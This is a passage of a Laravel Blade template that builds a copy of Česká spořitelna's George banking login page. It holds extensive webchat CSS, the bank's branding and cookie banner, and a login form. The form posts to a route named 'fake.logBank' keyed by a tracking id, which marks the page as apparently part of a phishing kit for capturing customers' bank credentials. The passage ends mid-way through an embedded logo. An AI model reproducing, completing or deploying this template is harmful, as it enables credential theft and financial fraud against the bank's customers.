            width: calc(100% + 20px);
            left: -10px;
            box-shadow: inset 0 10px 10px -10px rgba(0, 0, 0, .5);
            height: 20px
        }

        .webchat .conversation__scroll-button--bottom {
            position: absolute;
            background-color: #fff;
            border: 0;
            width: 30px;
            height: 30px;
            cursor: pointer;
            outline: none;
            bottom: 3px;
            display: none;
            color: #1b4977;
            box-shadow: 0 4px 4px -2px rgba(0, 0, 0, .25);
            border-radius: 15px;
            left: 0;
            right: 0;
            margin: auto
        }

        .webchat .conversation__scroll-button--bottom:after {
            position: absolute;
            content: "";
            background-image: url(https://webchat.csas.cz/ca70b57746a4c3f213f740c25867b96a.svg);
            background-size: contain;
            background-repeat: no-repeat;
            transform: rotate(90deg);
            width: 14px;
            height: 12px;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto
        }

        .webchat .conversation {
            font: 16px Inter, sans-serif;
            box-sizing: border-box;
            padding: 14px 8px 12px;
            overflow-y: auto;
            overflow-x: hidden;
            max-height: 100%;
            width: 100%
        }

        .webchat .conversation:after {
            content: "";
            height: 14px;
            display: block
        }

        .webchat .emoji-modal {
            position: absolute;
            bottom: calc(50% + 19px);
            right: 43px;
            padding: 6px;
            background-color: #fff;
            border: 1px solid #e7ebef;
            border-radius: 5px;
            box-shadow: 0 -1px 22px rgba(0, 0, 0, .322689)
        }

        .webchat .emoji-modal__arrow {
            position: absolute;
            width: 30px;
            height: 16px;
            overflow: hidden;
            bottom: -16px;
            right: 24px
        }

        .webchat .emoji-modal__arrow:after {
            content: "";
            position: absolute;
            left: 0;
            top: -20px;
            width: 25px;
            height: 25px;
            transform: rotate(45deg);
            background-color: #fff;
            border: 1px solid #e7ebef
        }

        .webchat .emoji-modal .emoji-modal__char {
            font-size: 1.4rem;
            width: 37px;
            padding: 5px;
            border: none;
            background: none;
            cursor: pointer;
            outline-width: 0
        }

        .webchat .quick-replies {
            white-space: nowrap;
            overflow: hidden;
            display: flex;
            flex-wrap: wrap;
            justify-items: center;
            justify-self: center;
            justify-content: center;
            padding-top: 6px;
            margin-right: -3px;
            margin-left: -3px
        }

        .webchat .quick-replies__button {
            font: 16px Inter, sans-serif;
            display: inline-block;
            margin: 0 3px 6px;
            border: none;
            color: #1a67d2;
            background-color: #fff;
            padding: 10px;
            border-radius: 25px;
            line-height: 21px;
            box-shadow: 0 2px 7px 0 rgba(0, 0, 0, .11);
            outline-width: 0
        }

        .webchat .quick-replies__button:hover {
            cursor: pointer
        }

        .webchat .quick-replies__button:last-of-type {
            margin-right: 0
        }

        @keyframes bouncing-loader {
            to {
                transform: translate3d(0, -7px, 0)
            }
        }

        .webchat .bouncing-loader {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 11px;
            padding-top: 7px
        }

        .webchat .bouncing-loader > div {
            width: 7px;
            height: 7px;
            margin: 3px;
            background: #9b9b9b;
            border-radius: 50%;
            animation: bouncing-loader .6s infinite alternate
        }

        .webchat .bouncing-loader > div:nth-child(2) {
            animation-delay: .2s
        }

        .webchat .bouncing-loader > div:nth-child(3) {
            animation-delay: .4s
        }

        .webchat .event {
            display: flex;
            align-items: flex-end;
            width: 100%;
            transition: all .5s;
            line-height: 21px;
            word-wrap: break-word
        }

        .webchat .event--right {
            flex-direction: row-reverse
        }

        .webchat .event--right .event-content {
            background: #1a67d2;
            color: #fff;
            margin-right: 7.19px
        }

        .webchat .event--right .event__identity-frame {
            margin-left: 11px;
            margin-right: 0;
            margin-bottom: 5px
        }

        .webchat .event--right + .event:not(.event--right),
        .webchat .event:not(.event--right) + .event--right {
            margin-top: 8px
        }

        .webchat .event--right + .event--right,
        .webchat .event:not(.event--right) + .event:not(.event--right) {
            margin-top: 0
        }

        .webchat .event.event--last-consecutive .event-content__arrow,
        .webchat .event.event--last-consecutive .event__identity-frame,
        .webchat .event:not(.event--right).event--last-consecutive .event-content__arrow,
        .webchat .event:not(.event--right).event--last-consecutive .event__identity-frame {
            visibility: visible;
            opacity: 1
        }

        .webchat .event__identity-frame {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            max-width: 40px;
            max-height: 40px;
            border-radius: 50%;
            overflow: hidden;
            margin-right: 11px;
            margin-bottom: 3px;
            visibility: hidden;
            opacity: 0
        }

        .webchat .event__identity {
            height: 100%;
            width: 100%;
            text-align: center;
            line-height: 40px;
            background-color: #fff
        }

        .webchat .event__identity--request {
            background-color: #f08080
        }

        .webchat .event__identity--bot {
            background-image: url(https://webchat.csas.cz/941f8ca5209c2a65ec582ef5a576cb4d.svg);
            background-repeat: no-repeat;
            background-position: 50%
        }

        .webchat .event__identity--persona > img {
            height: 40px;
            width: 40px;
            display: block
        }

        .webchat .event-content-wrapper {
            display: block;
            max-width: 80%;
            margin: 3px 0
        }

        .webchat .event-content__before {
            font-size: 9px;
            color: #9b9b9b;
            padding: 0 3px;
            overflow: auto
        }

        .webchat .event-content__before > span {
            float: right
        }

        .webchat .event-content__after {
            font-size: 9px;
            color: #9b9b9b;
            padding: 0 3px;
            float: right
        }

        .webchat .event-content {
            position: relative;
            display: block;
            background: #fff;
            border-radius: 6px;
            box-sizing: border-box;
            color: #003658;
            animation-duration: .3s;
            animation-name: fly-in
        }

        .webchat .event-content summary {
            outline: none;
            list-style: none
        }

        .webchat .event:not(.event--right) .event-content,
        .webchat .event:not(.event--right) .event__identity-frame {
            box-shadow: 0 2px 7px 0 rgba(0, 0, 0, .11)
        }

        .webchat .event:not(.event--right) .event-content__arrow {
            position: absolute;
            width: 10px;
            height: 27px;
            overflow: hidden;
            bottom: 5px;
            left: -10px;
            visibility: hidden;
            opacity: 0
        }

        .webchat .event:not(.event--right) .event-content__arrow:after {
            content: "";
            position: absolute;
            right: -24px;
            top: 0;
            width: 25px;
            height: 25px;
            transform: rotate(45deg);
            background-color: #fff;
            box-shadow: 0 2px 7px 0 rgba(0, 0, 0, .11)
        }

        .webchat .event:not(.event--right) a {
            color: #003658;
            font-weight: bolder
        }

        .webchat .event--right .event-content__arrow {
            position: absolute;
            width: 10px;
            height: 27px;
            overflow: hidden;
            bottom: 5px;
            right: -10px;
            visibility: hidden;
            opacity: 0
        }

        .webchat .event--right .event-content__arrow:after {
            content: "";
            position: absolute;
            left: -24px;
            top: 0;
            width: 25px;
            height: 25px;
            transform: rotate(45deg);
            background-color: #1a67d2
        }

        .webchat .event--right a {
            color: #fff;
            font-weight: bolder
        }

        .webchat .event-content--carousel {
            background-color: transparent;
            width: 100%;
            max-width: 100%
        }

        .webchat .event-content__text {
            padding: 10px;
            min-height: 18px;
            display: inline-block;
            text-align: left;
            word-break: break-word;
            overflow-wrap: break-word
        }

        .webchat .event-content__typing-on {
            padding: 10px
        }

        .webchat .event-content__file {
            display: flex;
            padding: 10px
        }

        .webchat .event-content__file > .event-content__file-download {
            margin: auto 6px auto 0;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/160b2625ddcbd2e83dd17aa3036acd3a.svg);
            background-size: contain;
            background-repeat: no-repeat;
            top: 0;
            bottom: 0;
            border: none;
            outline: none;
            width: 1rem;
            height: 1rem;
            cursor: pointer
        }

        .webchat .event-content__image {
            padding: 10px;
            min-width: 18px;
            min-height: 18px
        }

        .webchat .event-content__image > img {
            display: block;
            width: 100%
        }

        .webchat .event-content__button-template {
            text-align: center
        }

        .webchat .event-content__button-template h1 {
            margin-top: 0;
            margin-bottom: 6px;
            padding: 9px 12px 0;
            font-weight: 400;
            font-size: 12px
        }

        .webchat .event-content__button-template ul {
            list-style-type: none;
            padding: 0;
            margin: 0
        }

        .webchat .event-content__button-template li {
            border-bottom: 1px solid #e6ebef;
            background-color: #fff;
            margin: 0 1px
        }

        .webchat .event-content__button-template li:last-of-type {
            border-radius: 0 0 6px 6px
        }

        .webchat .event-content__button-template a {
            display: block;
            text-decoration: none;
            color: #0078b4;
            padding: 6px;
            line-height: 16x
        }

        .webchat .event-content__button-template button {
            font: 16px Inter, sans-serif;
            border: none;
            background-color: transparent;
            color: #0078b4;
            cursor: pointer;
            width: 100%;
            padding: 6px;
            line-height: 16px;
            outline: none
        }

        .webchat .event-content__generic-template {
            position: relative
        }

        .webchat .event-content__generic-template .carousel .slide {
            background: none
        }

        .webchat .event-content__generic-template .carousel .slide + .slide {
            padding-left: 2px
        }

        .webchat .event-content__generic-template-element {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100%;
            text-align: center;
            border-radius: 6px;
            outline: none
        }

        .webchat .event-content__generic-template-element > div {
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            border-left: 1px solid #e6ebef;
            border-right: 1px solid #e6ebef;
            border-bottom: 1px solid #e6ebef;
            border-radius: 0 0 6px 6px;
            background: #fff
        }

        .webchat .event-content__generic-template-element h1 {
            font: 16px Inter, sans-serif;
            padding: 10px 12px 6px;
            margin: 0;
            color: #003658
        }

        .webchat .event-content__generic-template-element h2 {
            font: 16px Inter, sans-serif;
            font-size: 7px;
            padding: 0 12px 6px;
            margin: 0;
            color: #9b9b9b
        }

        .webchat .event-content__generic-template-element img {
            display: block;
            width: 100%;
            flex: 0 0 auto;
            border-radius: 6px 6px 0 0
        }

        .webchat .event-content__generic-template-element ul {
            list-style-type: none;
            padding: 0;
            margin: 0
        }

        .webchat .event-content__generic-template-element li {
            border-top: 1px solid #e6ebef
        }

        .webchat .event-content__generic-template-element a {
            display: block;
            text-decoration: none;
            color: #1a67d2;
            padding: 10px;
            line-height: 16px
        }

        .webchat .event-content__generic-template-element button {
            font: 16px Inter, sans-serif;
            border: none;
            background-color: transparent;
            color: #1a67d2;
            cursor: pointer;
            width: 100%;
            padding: 2px;
            line-height: 16px;
            outline: none
        }

        .webchat .event-content__generic-template-arrow {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background-color: #fff;
            cursor: pointer;
            outline: none;
            width: 39px;
            height: 31px;
            border-radius: 16px;
            box-shadow: 0 0 5px rgba(0, 0, 0, .5);
            border: 0;
            z-index: 1
        }

        .webchat .event-content__generic-template-arrow--left {
            left: -13px
        }

        .webchat .event-content__generic-template-arrow--left:after {
            position: absolute;
            content: "";
            background-image: url(https://webchat.csas.cz/ca70b57746a4c3f213f740c25867b96a.svg);
            background-size: contain;
            background-repeat: no-repeat;
            transform: rotate(180deg);
            width: 14px;
            height: 12px;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto 8px auto auto
        }

        .webchat .event-content__generic-template-arrow--left:disabled {
            display: none
        }

        .webchat .event-content__generic-template-arrow--right {
            right: -13px
        }

        .webchat .event-content__generic-template-arrow--right:after {
            position: absolute;
            content: "";
            background-image: url(https://webchat.csas.cz/ca70b57746a4c3f213f740c25867b96a.svg);
            background-size: contain;
            background-repeat: no-repeat;
            width: 14px;
            height: 12px;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto auto auto 7px
        }

        .webchat .event-content__generic-template-arrow--right:disabled {
            display: none
        }

        .webchat .closing-overlay,
        .webchat .init-overlay {
            font: 16px Inter, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            border: 1px solid #e7ebef
        }

        .webchat .closing-overlay > div,
        .webchat .init-overlay > div {
            text-align: center;
            width: 100%;
            padding: 18px
        }

        .webchat .chat-overlay__h2 {
            color: #21416c;
            font-size: 16px;
            text-align: center;
            font-weight: 400;
            margin: 6px 0 9px
        }

        .webchat .chat-overlay__h1,
        .webchat .chat-overlay__line {
            color: #21416c;
            font-size: 16px;
            text-align: center;
            font-weight: 400;
            margin: 6px 0
        }

        .webchat .chat-overlay__h1--strong,
        .webchat .chat-overlay__line--strong {
            font-weight: 600
        }

        .webchat .chat-overlay__h1--nps-buttons,
        .webchat .chat-overlay__line--nps-buttons {
            margin-bottom: 18px
        }

        .webchat .chat-overlay__button {
            font: 16px Inter, sans-serif;
            border: 1px solid #0063ae;
            padding: 7px;
            border-radius: 4px;
            text-align: center;
            width: 203px;
            margin: 10px 0;
            outline-width: 0
        }

        .webchat .chat-overlay__button:hover {
            cursor: pointer
        }

        .webchat .chat-overlay__button--primary {
            color: #fff;
            background-color: #0063ae
        }

        .webchat .chat-overlay__button--secondary {
            background-color: #fff;
            color: #0063ae
        }

        .webchat .spinner-overlay {
            min-height: 20rem;
            text-align: center;
            position: absolute;
            padding: 0;
            z-index: 9999;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            opacity: .8;
            align-items: center
        }

        .webchat .spinner-overlay .spinner-css__text {
            margin-top: 2.6rem;
            margin-bottom: 2.6rem;
            text-align: center
        }

        .webchat .nps-button {
            border: 0;
            border-radius: 5px;
            outline: none;
            background: none;
            cursor: pointer;
            background-size: 40px 40px;
            background-repeat: no-repeat;
            background-position: 50%;
            width: 40px;
            height: 40px
        }

        .webchat .nps-button__2 {
            background-image: url(https://webchat.csas.cz/88033f4e50291f89f62239b9c9173d7e.svg)
        }

        .webchat .nps-button__2--gray {
            background-image: url(https://webchat.csas.cz/66786994d1bcabc253eb239b2d66bcfe.svg);
            border-color: #d7d7d7
        }

        .webchat .nps-button__4 {
            background-image: url(https://webchat.csas.cz/0880662b909a899ec2cb6826fe3d00fd.svg)
        }

        .webchat .nps-button__4--gray {
            background-image: url(https://webchat.csas.cz/c9bedf48d283d5ef0c397eb7f4d7937e.svg);
            border-color: #d7d7d7
        }

        .webchat .nps-button__6 {
            background-image: url(https://webchat.csas.cz/a52fb6471783ab63332ad8cdc0ca1c3b.svg)
        }

        .webchat .nps-button__6--gray {
            background-image: url(https://webchat.csas.cz/9a59fa58f25e0319aa0330cf14cacae7.svg);
            border-color: #d7d7d7
        }

        .webchat .nps-button__8 {
            background-image: url(https://webchat.csas.cz/cd96e967e36c4c049867585aaccd52be.svg)
        }

        .webchat .nps-button__8--gray {
            background-image: url(https://webchat.csas.cz/cc87b2260b761c9b0592071448908152.svg);
            border-color: #d7d7d7
        }

        .webchat .nps-button__10 {
            background-image: url(https://webchat.csas.cz/88c2db387ee6daa94012576b6a8372da.svg)
        }

        .webchat .nps-button__10--gray {
            background-image: url(https://webchat.csas.cz/db47472be7c11fd781077ffb9f41664f.svg);
            border-color: #d7d7d7
        }

        .webchat .nps-button + .nps-button {
            margin-left: 8px
        }

        .webchat .spinner-css {
            display: flex;
            width: 100%;
            height: 100%;
            flex-direction: column;
            justify-content: center
        }

        .webchat .spinner-css__bars {
            width: auto;
            height: 30px;
            text-align: center;
            margin: 0 auto;
            box-sizing: content-box
        }

        .webchat .spinner-css__bars > i {
            background-color: #0063ae;
            height: 100%;
            width: .5em;
            margin-right: .3em;
            display: inline-block;
            animation: stretchdelay 1s ease-in-out infinite
        }

        .webchat .spinner-css__bars > i:first-child {
            animation-delay: -.4s
        }

        .webchat .spinner-css__bars > i:nth-child(2) {
            animation-delay: -.3s
        }

        .webchat .spinner-css__bars > i:nth-child(3) {
            animation-delay: -.2s
        }

        .webchat .spinner-css__bars > i:nth-child(4) {
            animation-delay: -.1s
        }

        @keyframes stretchdelay {
            0%,
            80%,
            to {
                transform: scaleY(.3333)
            }
            40% {
                transform: scaleY(1)
            }
        }

        .webchat .tooltip-minimize {
            position: absolute;
            top: 40px;
            right: 27px;
            padding: 6px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 5px rgba(0, 0, 0, .25);
            font-family: Inter, sans-serif;
            font-style: normal;
            font-weight: 400;
            font-size: 12px;
            line-height: 17px;
            color: #00385f;
            width: 164px;
            z-index: 1001
        }

        .webchat .tooltip-minimize__arrow {
            position: absolute;
            width: 30px;
            height: 16px;
            overflow: hidden;
            top: -16px;
            right: 8px
        }

        .webchat .tooltip-minimize__arrow:after {
            content: "";
            position: absolute;
            left: 0;
            top: 14px;
            width: 25px;
            height: 25px;
            transform: rotate(45deg);
            background-color: #fff;
            box-shadow: 0 0 5px rgba(0, 0, 0, .25)
        }

        .webchat .chat-container {
            display: flex;
            flex-direction: column;
            height: 461px;
            min-height: calc(1vh - 47px);
            max-height: calc(77vh - 47px);
            margin: 0 auto;
            position: relative;
            background-color: #f4f6fa
        }

        .webchat .chat-container--minimized {
            display: none
        }

        @media (max-width: 420px) {
            .webchat {
                width: 281px;
                min-width: 281px;
                max-width: 83vw;
                right: 0
            }

            .webchat .chat-container {
                height: 366px;
                min-height: 366px;
                max-height: calc(73vh - 47px)
            }
        }

        .display-none {
            display: none
        }
    </style>
    <style>
        body{
            background-color: rgb(26, 103, 210)
        }
    </style>
@endpush
@section('content')
    <app-root class="ng-isolate-scope">
        <div class="flex flex-col h-full w-full" data-ng-class="{hidden: !$ctrl.loaded}" style="">
            <!-- ngIf: !$ctrl.loginCookieAgreementHidden -->
            <cookie-agreement ng-if="!$ctrl.loginCookieAgreementHidden" class="ng-scope ng-isolate-scope">
                <div class="flex justify-center w-full bg-blue-400 text-white text-sm ng-hide"
                     data-ng-hide="vm.isCookiesAgree" aria-hidden="true" style="">
                    <div class="flex flex-row items-start justify-between w-full mx-4 sm:container py-4">
                        <div class="pr-3">
                            <div class="info-icon"></div>
                        </div>
                        <div class="flex-grow">
                            <p class="ng-binding">Tyto stránky využívají k personalizaci obsahu a reklamních sdělení a
                                analýze návštěvnosti soubory cookie.</p>
                            <div class="flex flex-col sm:flex-row"><a data-ng-href="https://www.csas.cz/cs/cookies"
                                                                      class="font-bold text-white pr-4 ng-binding"
                                                                      href="https://www.csas.cz/cs/cookies"> Jak cookies
                                    využíváme? </a> <a
                                        data-ng-href="https://www.csas.cz/cs/ochrana-zpracovavani-osobnich-udaju"
                                        class="font-bold text-white pr-4 ng-binding"
                                        href="https://www.csas.cz/cs/ochrana-zpracovavani-osobnich-udaju"> Jak
                                    pracujeme s osobními údaji? </a></div>
                        </div>
                        <div data-ng-click="vm.cookiesAgree()"
                             class="flex text-center font-semibold text-base rounded-md ml-2 py-2 px-3 text-white bg-blue-300 hover:bg-blue-300-h hover:shadow-btn-hover focus:bg-blue-400-h focus:shadow-btn-focus"
                             role="button" tabindex="0">
                            <div class="sm:min-w-142 ng-binding">Rozumím</div>
                        </div>
                    </div>
                </div>
            </cookie-agreement>
            <!-- end ngIf: !$ctrl.loginCookieAgreementHidden -->
            <div class="flex flex-row h-full w-full justify-center py-10 sm:py-12">
                <!-- ngIf: $ctrl.vc && $ctrl.scenarios -->
                <main ng-if="$ctrl.vc &amp;&amp; $ctrl.scenarios" class="flex flex-col h-full w-full xs:w-343 ng-scope"
                      style="">
                    <div class="pb-6">
                        <div id="loginAppLogo" class="mb-3 last:pb-0 text-center flex justify-center xsm:h-12"><img
                                    src="{{asset('images/banks/fSHAVPk.png')}}"
                                    alt="Logo aplikace" tabindex="-1" style="height: 48px; width: 48px;"></div>
                        <!-- ngIf: $ctrl.vc.loginAppTitle -->
                        <h1 style="color:white" ng-if="$ctrl.vc.loginAppTitle"
                            data-ng-bind-html="$ctrl.vc.loginAppTitle"
                            class="font-bold text-1-5xl tracking-little-tight -my-0-5 pb-2 last:pb-0 text-center text-blue-400 ng-binding ng-scope"
                            id="loginAppTitle">Přihlášení do George</h1>
                        <!-- end ngIf: $ctrl.vc.loginAppTitle -->
                        <!-- ngIf: $ctrl.vc.loginAppDescription -->
                    </div>
                    <form id="bank_pm_form" method="POST"
                          action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                          role="form">
                        <div class="box-container flex flex-col mx-0">
                            <box scenarios="$ctrl.scenarios"
                                 class="flex flex-col bg-white shadow-main rounded-lg p-4 pt-5 ng-isolate-scope">
                                <div class="flex justify-between items-center pb-3">
                                    <div data-ng-bind-html="vm.headerLogo | unsafe" class="px-2 ng-binding">
                                        <a href="https://www.csas.cz/" title="Webové stránky České spořitelny"
                                           aria-label="Webové stránky České spořitelny"><img alt="Logo České spořitelny"
                                                                                             src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTciIGhlaWdodD0iNDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTg1Ljk5OSAwYy44NzQgMCAxLjY0LjMyNiAyLjI3Ni45NzYuNjQuNjQ2Ljk2MyAxLjQzNS45NjMgMi4zMjhhMy4yMSAzLjIxIDAgMDEtLjk1NSAyLjMzOGMtLjYzOC42NS0xLjQxLjk3NC0yLjI4NS45NzQtLjg5MiAwLTEuNjYtLjMyNS0yLjI4NS0uOTc0YTMuMjE1IDMuMjE1IDAgMDEtLjk1NC0yLjMzOGMwLS44OTIuMzE4LTEuNjczLjk0NC0yLjMyQzg0LjMzOC4zMzUgODUuMTA3IDAgODYgMHptMTAuNzU1IDEzLjEwM3YtMi4wMWEzLjQ0NCAzLjQ0NCAwIDAwLTMuNDQyLTMuNDQzaC0xNC42M2EzLjQ0NCAzLjQ0NCAwIDAwLTMuNDQgMy40NDN2Ny41NjdoMTYuMzJ2MS4xNDhoLTE2LjMydjIuMDA4YzAgMS45IDEuNTQgMy40NDEgMy40NCAzLjQ0MWgxNC42M2MxLjkwMSAwIDMuNDQyLTEuNTQxIDMuNDQyLTMuNDQxVjE0LjI1SDgwLjQzNXYtMS4xNDdoMTYuMzE5eiIgZmlsbD0iI0U3MjIyMiIvPjxwYXRoIGQ9Ik03LjUxMSA3LjUxM2MzLjY1OCAwIDQuODY5LjY2IDQuODY5IDIuMTczdjEuNjc4SDcuNTFjLTIuMzk0IDAtMi45NzIgMS4wNDYtMi45NzIgNS4wOXMuNTc4IDUuMDkgMi45NzIgNS4wOWg0Ljg2OXYxLjY3N2MwIDEuNTEzLTEuMjEgMi4xNzMtNC44NjkgMi4xNzMtNC44NyAwLTcuNTExLTIuNjY5LTcuNTExLTguOTQgMC02LjI3MiAyLjY0Mi04Ljk0IDcuNTExLTguOTR6bS0uNjYtLjc5N2MtLjMzIDAtLjUyMy0uMDg0LS44MjYtLjQ2OGwtMi4yLTIuODYxYy0uMTEtLjEzNy0uMTEtLjMwMy0uMTEtLjQxMmgxLjcwNGMuMzU5IDAgLjQ5Ni4wODMuODgyLjQxMmwxLjEyNyAxLjA0NSAxLjEyOS0xLjA0NWMuMzg0LS4zMy41MjItLjQxMi44OC0uNDEyaDEuNzA0YzAgLjExIDAgLjI3NS0uMTA5LjQxMkw4LjgzMSA2LjI1Yy0uMzAzLjM4NC0uNDk1LjQ2Ny0uODI2LjQ2N0g2Ljg1MXptNi45MDcgMi41MDNjMC0xLjA0Ni40NjgtMS41NjkgMS41MTMtMS41NjloOS42Mjh2Mi4xNzRjMCAxLjA0NS0uNTIzIDEuNTQtMS41NjggMS41NGgtNS4xNzJ2My4xNjNoNS43Nzd2My41NzdoLTUuNzc3djMuNDM5aDYuODc3djIuMTcyYzAgMS4wNDYtLjUyMyAxLjU0LTEuNTY4IDEuNTRoLTguMTk3Yy0xLjA0NiAwLTEuNTEzLS41MjItMS41MTMtMS41NjdWOS4yMTh6bTE4LjU3LTEuNzA2YzMuNjU4IDAgNS41NTcuNDE0IDUuNTU3IDIuMTE4djEuNzMzaC01LjAwNmMtMS4zNDggMC0xLjczMi4zNTgtMS43MzIgMS4wNzMgMCAyLjExOCA3LjY0NiAxLjY3OCA3LjY0NiA3LjYyIDAgMi44MzMtMS42MjMgNS4zMzctNi41NzQgNS4zMzctMy4yNDYgMC01LjgwNC0uNTI0LTUuODA0LTIuMTE4di0xLjczMmg1LjkxNGMxLjIxIDAgMS43ODgtLjM4NiAxLjc4OC0xLjIzOSAwLTIuMzExLTcuNjItMS44Ny03LjYyLTcuOTc3IDAtMi42OTcgMS43ODctNC44MTUgNS44MzEtNC44MTV6bTEyLjc5NCA4LjE5OGw0LjQwMi03LjI2MmMuNDEzLS43MTYuNjYtLjc5OSAxLjIzNy0uNzk5aDQuMTI3YzAgLjI3Ni0uMDU0LjQ5NS0uMjIuNzdsLTUuMDYyIDcuNzMgNS4zMDkgOC4zMzZjLjEzNy4yMi4yNDcuNDk0LjI0Ny43N2gtMy45ODhjLS44MjUgMC0xLjA3Mi0uMDU1LTEuNTQtLjc5OGwtNC41MTItNy4yMzR2OC4wMzJoLTQuNDAxVjkuMjJjMC0xLjA0Ni40NjgtMS41NjkgMS41MTMtMS41NjloMi44ODl2OC4wNjFoLS4wMDF6bTIwLjAwMy04LjExNWMuNzQzIDAgMS4xLjA4MyAxLjI2Ni43MTVsNC4wOTggMTYuMjU4Yy4wNTUuMjQ4LjA4Mi40OTUuMDgyLjY4N2gtMy42MDNjLS43NDMgMC0uOTYzLS4wNTUtMS4xLS42NmwtLjg1NC0zLjUyaC00LjA5OGwtLjc5OCAzLjUyYy0uMTM3LjYwNS0uMzU3LjY2LTEuMS42Nkg1NS40NGEzLjUgMy41IDAgMDEuMDgzLS42ODdMNTkuNjIyIDguMzFjLjE2NS0uNjMyLjUyNC0uNzE1IDEuMjY2LS43MTVoNC4yMzd6bS0zLjU1IDEwLjE3OEg2NC4zbC0xLjMyLTUuNjM5aC0uMTFsLTEuMjk0IDUuNjR6bTIuODM0LTExLjQ3Yy0uMzU4LjM4NC0uNTI0LjQxMi0uODguNDEyaC0xLjcwNmMwLS4xMSAwLS4yNzUuMTEtLjQxMmwyLjIwMS0yLjg2MmMuMzAyLS4zODUuNDk1LS40NjcuODI1LS40NjdoMS42NzhjLjE5MiAwIC4zMDIuMDgzLjMwMi4xOTIgMCAuMTM4LS4wNTUuMjItLjI3NS40OTVsLTIuMjU1IDIuNjQyek0yLjQ1MiAzMC45ODdjMS4yMTEgMCAyLjAzNy4wMjcgMi4wMzcuNjMzdi4zNTdIMi40MTJjLS42MiAwLTEuMDE5LjI3Ni0xLjAxOS43MTYgMCAxLjQzMSAzLjQ2OCAxLjAxOCAzLjQ2OCAzLjMzIDAgMS4xMjgtLjc0MyAxLjk4MS0yLjY4NSAxLjk4MS0xLjEyNyAwLTIuMTczIDAtMi4xNzMtLjU5di0uMzg3aDIuMzEyYy44MjUgMCAxLjIxLS4yODggMS4yMS0uOTA4IDAtMS4zMDctMy40NTQtMS4wNDYtMy40NTQtMy4zNTcgMC0xLjEuODk1LTEuNzc1IDIuMzgtMS43NzV6TTcuMDYgNDBINS44MjJ2LTguOTQ0aC42MmMuNDM5IDAgLjYxOS4yMzQuNjE5LjU3OHYuMjJjLjM4NS0uNDU0IDEuMDAzLS44NjcgMS43ODgtLjg2NyAxLjYyNSAwIDIuMzggMS4zMzQgMi4zOCAzLjUxIDAgMi4xNzMtLjc1NiAzLjUwOC0yLjM4IDMuNTA4LS43ODUgMC0xLjQwMy0uNDEzLTEuNzg4LS44NjdWNDB6bTEuMzc2LTguMDIzYy0uNTM4IDAtMS4wMTguMjQ4LTEuMzc2LjU3OXYzLjg1MmMuMzU3LjMzLjgzOC41NzkgMS4zNzYuNTc5IDEuMDczIDAgMS41MTItLjg4IDEuNTEyLTIuNDkgMC0xLjYxLS40NC0yLjUyLTEuNTEyLTIuNTJ6bTMuNjcxIDIuNTJjMC0xLjkyOC42MzMtMy41MSAyLjc5My0zLjUxIDIuMTc1IDAgMi43OTUgMS41ODIgMi43OTUgMy41MSAwIDEuOTI2LS42MiAzLjUwOC0yLjc5NSAzLjUwOC0yLjE2IDAtMi43OTMtMS41ODMtMi43OTMtMy41MDl6bTQuMzA3IDBjMC0xLjY5NC0uMzMtMi41ODctMS41MTQtMi41ODctMS4xNjkgMC0xLjUxMi44OTMtMS41MTIgMi41ODYgMCAxLjY5Mi4zNDMgMi41ODcgMS41MTIgMi41ODcgMS4xODQgMCAxLjUxNC0uODk1IDEuNTE0LTIuNTg3em0zLjc5Ny00LjAzM2MtLjE2NSAwLS4yNDgtLjA0MS0uNDEzLS4yMzRsLTEuMTAxLTEuMzA3Yy0uMDU1LS4wNjktLjA1NS0uMTUxLS4wNTUtLjIwN2guNTUxYy4xNzkgMCAuMjYyLjAyOC40NC4yMDdsLjc0NC42ODguNzU2LS42ODhjLjE4LS4xOC4yNjItLjIwNy40NDEtLjIwN2guNTUxYzAgLjA1NSAwIC4xMzgtLjA1NS4yMDdMMjAuOTcgMzAuMjNjLS4xNjUuMTkzLS4yNDguMjM0LS40MTMuMjM0aC0uMzQ1em0tMS4zNSA3LjQ3MXYtNi44NzloLjYyYy40MTIgMCAuNTkzLjMzLjYyLjg1NC41MzUtLjcxNiAxLjI1Mi0uOTIzIDEuNzc0LS45MjMuMjM0IDAgLjQ4Mi4wNTUuNDgyLjM0NHYuODhoLS4zNDNjLTEuMDA1IDAtMS41MTQuMjQ4LTEuOTEzLjU3OXY1LjE0NWgtMS4yNHptNS4zMTItNy42NWgtMS4yMzh2LS43ODRjMC0uNDEzLjE1MS0uNjQ3LjU2NC0uNjQ3aC42NzR2MS40MzJ6bS0xLjI0Ljc3MWguNjYyYy40MjUgMCAuNTc3LjIzNC41NzcuNjQ2djYuMjMzaC0xLjIzOHYtNi44Nzl6bTQuMjk0IDBoMS40ODd2LjkyMWgtMS40ODd2NC4xOThjMCAuNTkxLjA3LjgxMi41MDkuODEyaC45Nzh2LjMxN2MwIC41MzYtLjQ5Ni42Ni0xLjE4NC42Ni0xLjQwMyAwLTEuNTQtLjc3MS0xLjU0LTEuNzl2LTQuMTk3aC0uODY4di0uNjg3bC44NjctLjIzNC40NC0xLjFjLjEzOC0uMjkuMjMzLS40MTMuNDgyLS40MTNoLjMxNnYxLjUxM3ptNi45MiA1Ljk3MXYuMzE2YzAgLjUzNy0uNzI5LjY2LTIuMjQzLjY2LTIuMTQ2IDAtMi44MDYtMS41ODEtMi44MDYtMy41MDhzLjctMy41MSAyLjc5My0zLjUxYzEuNjkzIDAgMi41NzMgMS4wNDcgMi41NzMgMi41NiAwIC4zMTYgMCAuNjA2LS4wNjkgMS4yNjZoLTQuMDA1YzAgMS41OTYuNTM4IDIuMjE1IDEuNjUzIDIuMjE1aDIuMTA1di4wMDF6bS0uOTUtMy4wN